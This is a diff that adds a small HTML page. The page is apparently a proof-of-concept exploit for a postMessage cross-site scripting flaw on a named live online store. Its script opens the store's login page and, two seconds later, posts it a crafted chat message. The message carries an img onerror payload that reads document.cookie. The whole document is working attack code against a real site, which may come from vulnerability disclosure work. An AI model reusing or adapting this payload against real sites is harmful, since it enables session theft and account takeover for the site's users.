@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+    function poc() {
+        var w = window.open("https://tienda.tork.mx/login?ReturnUrl=%2f_secure%2faccount")
+        setTimeout(function(){w.postMessage({"action":"NEWMESSAGE","message":{"message":"<img src=1 onerror=alert(document.cookie)>", "bot":false}},"*");}, 2000);
+    };
+    poc()
+    </script>
+</body>
+</html>
